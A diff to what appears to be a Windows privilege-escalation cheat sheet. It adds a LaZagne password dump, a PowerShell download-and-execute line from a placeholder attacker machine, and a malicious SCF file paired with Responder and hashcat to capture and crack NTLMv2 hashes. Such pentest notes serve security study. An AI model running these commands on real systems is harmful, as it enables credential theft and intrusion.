@@ -509,7 +509,40 @@ PS C:\user> Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=dom
 ### Browser Credentials
 
 - We can use [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrive cookies and saved logins from Google Chrome
+- We can use [lazagne](https://github.com/AlessandroZ/LaZagne) to dump passwords from the system `.\lazagne.exe all`
 
+## Other ways to privesc
+
+### Interact with users
+
+- Capture traffic if wireshark is installed
+- Process monitoring
+  ```
+  while($true)
+  {
+
+    $process = Get-WmiObject Win32_Process | Select-Object CommandLine
+    Start-Sleep 1
+    $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
+    Compare-Object -ReferenceObject $process -DifferenceObject $process2
+
+  }
+  ```
+  - `IEX (iwr 'http//IP-OF-ATTACK-MACHINE/procmon.ps1')` execute the script from our target with the code hosted in our attacking machine
+- Vulnerable service abuse
+- Shell Command File on File Share to capture ntlmv2 pass hash.
+  - We need an interesting share writable by our user `accesschk -s -w C:\folder-of-shares`
+  - Create a malicious SCF file and name it with an @ at the start for example `@Inventory.scf`
+  ```
+  [Shell]
+  Command=2
+  IconFile=\\ATTACK-IP\share\legit.ico
+  [Taskbar]
+  Command=ToggleDesktop
+  ```
+  - We then just need to start Responder 
+    - `sudo responder -wrf -v -I INTERFACE-USED` (your interface can be tun0 for instance it has to be one reachable by the target)
+  - Finally we can crack the found hash with hashcat `hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt`
 
 ## Resources
 
